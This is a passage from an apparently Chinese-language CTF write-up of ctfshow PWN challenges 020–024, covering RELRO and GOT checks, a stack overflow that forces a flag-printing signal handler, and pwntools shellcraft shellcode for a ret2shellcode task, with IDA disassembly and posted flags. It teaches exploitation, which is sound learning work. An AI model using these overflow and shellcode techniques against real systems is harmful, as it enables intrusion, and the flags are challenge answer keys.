	srcset="/p/ctfshow-pwn-writeup/51_hu_ec1407a9bbbb57d8.png 480w, /p/ctfshow-pwn-writeup/51_hu_5eec920743e7e000.png 1024w"
	loading="lazy"
	
		alt="Hint提示：什么是RETRO保护"
	
	
		class="gallery-image" 
		data-flex-grow="285"
		data-flex-basis="686px"
	
></p>
<p>在<a class="link" href="https://expl0rer.top/p/pwn-1/#relro"  target="_blank" rel="noopener"
    >PWN-1的Linux安全防护机制</a>这一章的学习中，我们有认识到RELRO这个保护。很显然no RELRO意味着.got和.got.plt表都可写。</p>
<p>用指令查表地址：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">readelf -S PWN_020
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/52.png"
	width="1044"
	height="630"
	srcset="/p/ctfshow-pwn-writeup/52_hu_9e02d9e9ca78633b.png 480w, /p/ctfshow-pwn-writeup/52_hu_cfc6139e4ad6cdf.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="165"
		data-flex-basis="397px"
	
></p>
<p>耐心找一下就找到了，故flag:ctfshow{1_1_0x600f18_0x600f28}</p>
<h3 id="pwn_021">PWN_021
</h3><p>题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</p>
<p>例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</p>
<p>最终flag为ctfshow{1_1_0x400820_0x8208820}</p>
<p>若某个表不存在，则无需写其对应地址</p>
<p>如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}</p>
<p><a class="link" href="PWN_021" >PWN_021</a></p>
<hr>
<p>checksec一下：</p>
<p><img src="/p/ctfshow-pwn-writeup/53.png"
	width="1215"
	height="610"
	srcset="/p/ctfshow-pwn-writeup/53_hu_8be2513129fe3dd3.png 480w, /p/ctfshow-pwn-writeup/53_hu_b1f2d1e70b5f95ba.png 1024w"
	loading="lazy"
	
		alt="partial Relro保护"
	
	
		class="gallery-image" 
		data-flex-grow="199"
		data-flex-basis="478px"
	
></p>
<p>要还不记得Relro保护机制原理的就回PWN-1去看吧&hellip;</p>
<p>这里是 GOT 表的前半部分（.got.plt）设置为只读，后半部分（.got）仍可写。</p>
<p>用readelf命令去爱看表地址就好了：</p>
<p><img src="/p/ctfshow-pwn-writeup/54.png"
	width="670"
	height="114"
	srcset="/p/ctfshow-pwn-writeup/54_hu_8d769b287fb3ac64.png 480w, /p/ctfshow-pwn-writeup/54_hu_3cbf63d5305f0ffc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="587"
		data-flex-basis="1410px"
	
></p>
<p>flag:ctfshow{0_1_0x600ff0_0x601000}</p>
<h3 id="pwn_021-1">PWN_021
</h3><p>题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</p>
<p>例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</p>
<p>最终flag为ctfshow{1_1_0x400820_0x8208820}</p>
<p>若某个表不存在，则无需写其对应地址</p>
<p>如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}</p>
<p><a class="link" href="PWN_021" >PWN_021</a></p>
<hr>
<p>道理一样checksec看relro的保护、readelf看表&hellip;..</p>
<p><img src="/p/ctfshow-pwn-writeup/55.png"
	width="725"
	height="153"
	srcset="/p/ctfshow-pwn-writeup/55_hu_4f21e41ae9717f96.png 480w, /p/ctfshow-pwn-writeup/55_hu_9ef604a41c7706ab.png 1024w"
	loading="lazy"
	
		alt=".got、.got.plt表都不可写"
	
	
		class="gallery-image" 
		data-flex-grow="473"
		data-flex-basis="1137px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/56.png"
	width="705"
	height="101"
	srcset="/p/ctfshow-pwn-writeup/56_hu_fd84664444ae0205.png 480w, /p/ctfshow-pwn-writeup/56_hu_beb3fc8924561d37.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="698"
		data-flex-basis="1675px"
	
></p>
<p>这次就只有一个.got表了，那就是flag：ctfshow{0_0_0x600fc0}</p>
<h3 id="pwn_023">PWN_023
</h3><p>题目：用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh ctfshow@题目地址 -p题目端口号
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>不是nc连接</strong>   <a class="link" href="PWN_023" >PWN_023</a></p>
<p><img src="/p/ctfshow-pwn-writeup/57.png"
	width="695"
	height="140"
	srcset="/p/ctfshow-pwn-writeup/57_hu_55b6f42bf446c46b.png 480w, /p/ctfshow-pwn-writeup/57_hu_a8dd5de87eab3f4f.png 1024w"
	loading="lazy"
	
		alt="checksec一下"
	
	
		class="gallery-image" 
		data-flex-grow="496"
		data-flex-basis="1191px"
	
></p>
<p>没有canary保护，这可以是个突破点：栈溢出漏洞。</p>
<p>看回IDA：</p>
<p><img src="/p/ctfshow-pwn-writeup/58.png"
	width="1060"
	height="615"
	srcset="/p/ctfshow-pwn-writeup/58_hu_803795aedfc75284.png 480w, /p/ctfshow-pwn-writeup/58_hu_31f0d9d5938f057f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="172"
		data-flex-basis="413px"
	
></p>
<p>跟进ctfshow函数</p>
<p><img src="/p/ctfshow-pwn-writeup/59.png"
	width="669"
	height="159"
	srcset="/p/ctfshow-pwn-writeup/59_hu_14eb223bc3e77877.png 480w, /p/ctfshow-pwn-writeup/59_hu_99cf8a4061518c1e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="420"
		data-flex-basis="1009px"
	
></p>
<p>可以知道，一开始dgets函数读取flag字符串到内存中</p>
<p>跟进signal函数：</p>
<p><img src="/p/ctfshow-pwn-writeup/60.png"
	width="529"
	height="139"
	srcset="/p/ctfshow-pwn-writeup/60_hu_e4f58d85598c5ca3.png 480w, /p/ctfshow-pwn-writeup/60_hu_e7413abc36f52d2b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="380"
		data-flex-basis="913px"
	
></p>
<p>这行代码会将内存中存储的 <code>flag</code> 字符串，输出到标准错误流（<code>stderr</code>）。因为程序启动时已经通过 <code>fgets</code> 从 <code>/ctfshow_flag</code> 文件读取了 flag 内容到 <code>flag</code> 变量中，所以这里能直接打印出正确的 flag。</p>
<p>所以说我们让程序报错也就是让它栈溢出，覆盖后的地址还不能是有效地址，让它全部报错，也就是我们可以输入好多个a就行，几十个a的16进制地址是无效地址。</p>
<p><img src="/p/ctfshow-pwn-writeup/61.png"
	width="945"
	height="394"
	srcset="/p/ctfshow-pwn-writeup/61_hu_dbfd74188df09469.png 480w, /p/ctfshow-pwn-writeup/61_hu_a8d8dd6c093b2cde.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="239"
		data-flex-basis="575px"
	
></p>
<p>关于栈溢出这部分，请看<a class="link" href="https://expl0rer.top/p/pwn-2/"  target="_blank" rel="noopener"
    >PWN-2</a>详细学习，PWN板块占比也是重要的。</p>
<p>逐渐开始上强度了，这时需要仔细看IDA的代码分析了，看看是什么工作原理。</p>
<p>flag：ctfshow{0f207f1f-71bb-4cdd-bdab-7bfb9acde27a}</p>
<h3 id="pwn_024">PWN_024
</h3><h4 id="题目">题目：
</h4><p>你可以使用<code>pwntools</code>的<code>shellcraft</code>模块来进行攻击</p>
<p><a class="link" href="PWN_024" >PWN_024</a></p>
<p>我来介绍一下shellcraft模块：它是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode（这里的不同体系是我们之前学过的<a class="link" href="https://expl0rer.top/p/%e7%bd%91%e5%ae%89%e5%ad%a6%e4%b9%a0%e7%ac%ac%e4%b8%80%e9%98%b6%e6%ae%b5/#%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%9f%ba%e7%a1%80"  target="_blank" rel="noopener"
    >操作系统基础的有关shell的那一章节</a>）有zsh、bash等。Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的Shellcode。</p>
<p>生成的汇编代码可直接通过 asm() 函数转换为机器码（二进制），无需手动处理格式，例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>  <span class="c1"># 一步完成“汇编模板→机器码”转换，类似C语言的编译器功能，转换成机器语言。</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>IDA：可以看到这题似乎和ret2shellcode有关</p>
<p><img src="/p/ctfshow-pwn-writeup/63.png"
	width="1045"
	height="415"
	srcset="/p/ctfshow-pwn-writeup/63_hu_8320440ce8e9ad20.png 480w, /p/ctfshow-pwn-writeup/63_hu_f063bc9aa051b388.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="604px"
	
></p>
<p>看题目提示，进入新大陆了&hellip;用pwntools了。</p>
<p><img src="/p/ctfshow-pwn-writeup/64.png"
	width="710"
	height="295"
	srcset="/p/ctfshow-pwn-writeup/64_hu_2df4fc228f333ed2.png 480w, /p/ctfshow-pwn-writeup/64_hu_ff2fcff08e5e36b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="240"
		data-flex-basis="577px"
	
></p>
<p>这里有提示，可以看一下<a class="link" href="https://expl0rer.top/p/pwn-1/#nx"  target="_blank" rel="noopener"
    >PWN-1-NX保护</a>，有啥启发？</p>
<p>在IDA分析可知，ctfshow函数无法跟进源代码，只能看它的伪代码去分析了（比较长）：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; Attributes: bp-based frame</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; int __cdecl ctfshow(_DWORD)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">public</span> <span class="nv">ctfshow</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">ctfshow</span>         <span class="nv">proc</span> <span class="nv">near</span>               <span class="c1">; CODE XREF: main+132↓p</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">buf</span>             <span class="err">=</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">88h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">var_4</span>           <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; __unwind {</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">push</span>    <span class="nb">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C7</span>                 <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C9</span>                 <span class="nv">push</span>    <span class="nb">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">CA</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">84h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D0</span>                 <span class="nv">call</span>    <span class="nv">__x86_get_pc_thunk_bx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D5</span>                 <span class="nv">add</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">(</span><span class="nv">offset</span> <span class="nv">_GLOBAL_OFFSET_TABLE_</span> <span class="o">-</span> <span class="kc">$</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="kd">DB</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">DE</span>                 <span class="nv">push</span>    <span class="mh">100h</span>            <span class="c1">; nbytes</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E3</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E9</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; buf</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EA</span>                 <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; fd</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EC</span>                 <span class="nv">call</span>    <span class="nv">_read</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F1</span>                 <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F4</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F7</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FD</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; s</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FE</span>                 <span class="nv">call</span>    <span class="nv">_puts</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048503</span>                 <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048506</span>                 <span class="nf">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">C</span>                 <span class="nv">call</span>    <span class="nb">eax</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">E</span>                 <span class="nv">nop</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">F</span>                 <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048512</span>                 <span class="nf">leave</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>                 <span class="nf">retn</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="c1">; } // starts at 80484C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="nf">ctfshow</span>         <span class="nv">endp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>如果之前是打逆向或者强行入门PWN的话，最坐牢的我相信应该是用IDA吧，除了找明文字符串flag外，你学了汇编语言你也看不懂这是啥意思，感觉一小串源代码转换成汇编语言非常长、枯燥，其实UP主也深有体会，在系统性入门后，也初步知道IDA是怎么用的，这里我把下划线“===== S U B R O U T I N E =====”也复制进来了，按我理解这是函数分界，分隔线上方是前一个函数的结尾（通常以<code>retn</code>指令结束，代表函数返回）过了这条线，说明汇编语言在描述的就是另外一个函数了。也就是说这上下分界线是代表囊括着一个函数，例如这ctfshow函数。</p>
<p>另外我想说的是汇编语言这么长是有道理的，它更像是一种“啰嗦”，它能在每一段代码运行后不断向你汇报地址变化，这种 “啰嗦” 本质上是<strong>对计算机底层操作的直接映射</strong>，这种特性确实让它在跟踪程序运行细节、分析逻辑和排查问题时具有独特优势。</p></blockquote>
<p>从这里开始就要用pwntools了，这里介绍一下：</p>
<blockquote class="alert alert-note">
    <blockquote>
<p><code>from pwn import *</code> 是在 Python 中使用 <code>pwntools</code> 库的常见导入方式 。<code>pwntools</code> 是一个功能强大的用于二进制漏洞利用（binary exploitation）的 Python 库，在 CTF（Capture The Flag，夺旗赛 ）竞赛、安全研究以及漏洞分析等领域广泛应用，以下是其具体作用：</p>
<h4 id="与目标程序交互">与目标程序交互
</h4><ul>
<li><strong>本地进程交互</strong>：<code>pwntools</code> 能轻松创建本地进程，模拟用户输入、获取程序输出。例如，<code>p = process('./vulnerable_program')</code> 可以启动本地的可执行文件 <code>vulnerable_program</code>，然后通过 <code>p.sendline('input data')</code> 向程序发送数据，用 <code>p.recvuntil('prompt')</code> 接收程序输出直到遇到特定字符串。</li>
<li><strong>远程服务器交互</strong>：在面对远程存在漏洞的服务时，<code>pwntools</code> 提供了便捷的方法。比如 <code>r = remote('target.com', 8080)</code> 可以连接到 <code>target.com</code> 服务器的 8080 端口，后续同样能发送和接收数据，方便对远程服务进行测试和漏洞利用。</li>
</ul>
<h4 id="二进制数据处理">二进制数据处理
</h4><ul>
<li><strong>数据打包和解包</strong>：在二进制程序中，经常需要处理不同字节序（大端序、小端序）的数据。<code>pwntools</code> 提供了 <code>pack</code> 和 <code>unpack</code> 函数，比如 <code>p32(0x12345678)</code> 可以将整数 <code>0x12345678</code> 按照小端序打包成 4 字节的二进制数据；<code>u32(data)</code> 则可以将 4 字节的二进制数据按照小端序解包为整数。</li>
<li><strong>数据转换</strong>：它还支持各种数据格式之间的转换，如将字符串转换为字节串，或者进行十六进制与二进制数据之间的转换等。</li>
</ul>
<h4 id="辅助漏洞利用">辅助漏洞利用
</h4><ul>
<li><strong>生成 Payload</strong>：对于缓冲区溢出等漏洞，需要精心构造 Payload（攻击载荷）。<code>pwntools</code> 提供了生成填充数据、构造 ROP（Return-Oriented Programming，返回导向编程 ）链等功能。比如 <code>cyclic(100)</code> 可以生成一个 100 字节的循环模式字符串，用于确定缓冲区溢出的偏移量；通过 <code>ROP</code> 模块可以方便地构建 ROP 链来绕过一些安全机制，实现代码执行。</li>
<li><strong>符号解析</strong>：在分析二进制程序时，有时需要解析程序中的函数地址、变量地址等。<code>pwntools</code> 可以与 <code>ELF</code>（Executable and Linkable Format，可执行与可链接格式，常用于 Linux 系统中的可执行文件、共享库等 ）文件交互，获取这些符号信息，例如 <code>elf = ELF('./target_binary')</code> 可以加载目标二进制文件，然后通过 <code>elf.symbols['main']</code> 获取 <code>main</code> 函数的地址。</li>
</ul>
<h4 id="密码学相关辅助">密码学相关辅助
</h4><p>在 CTF 中，有时会涉及密码学题目，<code>pwntools</code> 也提供了一些基础的密码学辅助功能，比如常见加密算法的简单实现、编码解码等。</p>
<h4 id="多线程和异步支持">多线程和异步支持
</h4><p><code>pwntools</code> 一定程度上支持多线程和异步操作，这在同时与多个目标程序交互，或者需要在等待程序输出的同时执行其他任务时非常有用。</p></blockquote></blockquote>
<p>所以为啥要学<a class="link" href="https://expl0rer.top/p/python/"  target="_blank" rel="noopener"
    >Python</a>，当然能用<a class="link" href="https://www.doubao.com/chat/?from_logout=1"  target="_blank" rel="noopener"
    >豆包</a>、<a class="link" href="https://www.deepseek.com/"  target="_blank" rel="noopener"
    >DeepSeek</a>之类的AI帮你写代码exp，但你得先了解<a class="link" href="https://expl0rer.top/p/python/"  target="_blank" rel="noopener"
    >Python</a>再让它写才对的，有时会出错，你得有判断力。</p>
<blockquote>
<p>这里推荐使用Pycharm、Visual Studio Code；或者你可以在Kali上用终端来运行，这样你在Kali用nc连接靶机时在同一系统运行交互比较方便，当然Pycharm、Visual Studio Code也有终端功能，只不过要配PWN环境稍微麻烦而已，看你习不习惯用Linux系统吧。</p></blockquote>
<h4 id="题目后续">题目后续：
</h4><p>讲得比较啰嗦，这里开始分析这段汇编代码（重新粘贴了一遍，和上面一样）：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; Attributes: bp-based frame</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; int __cdecl ctfshow(_DWORD)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">public</span> <span class="nv">ctfshow</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">ctfshow</span>         <span class="nv">proc</span> <span class="nv">near</span>               <span class="c1">; CODE XREF: main+132↓p</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">buf</span>             <span class="err">=</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">88h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">var_4</span>           <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; __unwind {</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">push</span>    <span class="nb">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C7</span>                 <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C9</span>                 <span class="nv">push</span>    <span class="nb">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">CA</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">84h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D0</span>                 <span class="nv">call</span>    <span class="nv">__x86_get_pc_thunk_bx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D5</span>                 <span class="nv">add</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">(</span><span class="nv">offset</span> <span class="nv">_GLOBAL_OFFSET_TABLE_</span> <span class="o">-</span> <span class="kc">$</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="kd">DB</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">DE</span>                 <span class="nv">push</span>    <span class="mh">100h</span>            <span class="c1">; nbytes</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E3</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E9</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; buf</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EA</span>                 <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; fd</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EC</span>                 <span class="nv">call</span>    <span class="nv">_read</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F1</span>                 <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F4</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
